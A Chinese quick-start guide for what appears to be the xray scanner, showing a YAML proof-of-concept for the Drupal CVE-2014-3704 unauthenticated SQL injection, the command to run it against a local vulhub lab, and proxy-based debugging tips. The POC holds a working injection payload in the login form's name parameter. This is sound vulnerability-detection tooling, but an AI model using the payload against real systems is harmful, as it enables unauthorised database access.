# 快速开始

我们使用CVE-2014-3704进行举例，这是一个Drupal的未授权sql注入漏洞，靶场参考[vulhub/drupal/CVE-2014-3704](https://github.com/vulhub/vulhub/blob/master/drupal/CVE-2014-3704)

**POC:**
```yaml
name: poc-yaml-drupal-cve-2014-3704-sqli
transport: http
set:
  rand: randomInt(200000000, 210000000)
rules:
  r0:
    request:
      method: POST
      path: /?q=node&destination=node
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,(select md5({{rand}}))),0)%23]=bob&name[0]=a
    expression: >-
      response.status == 500 &&
      response.body.bcontains(bytes(substr(md5(string(rand)), 0, 31)))
expression: r0()
detail:
  author: test
  links:
    - https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2014-3704
```
## 如何使用 POC

将上述POC保存为drupal-cve-2014-3704-sqli.yml，假定与xray可执行文件存放于同一目录下，可执行如下命令：

```shell
./xray ws --poc drupal-cve-2014-3704-sqli.yml --url http://127.0.0.1:8080
```
![](../assets/poc/hit.png)

## 如何调试 POC

如果 poc 无法扫出期望的结果，可以按照以下思路调试

- 确定 poc 语法正确，payload 正确。
- 在配置文件 `http` 段中加入 `proxy: "http://proxy:port"`，比如设置 burpsuite 为代理，这样 poc 发送的请求可以在 burp 中看到，看是否是期望的样子。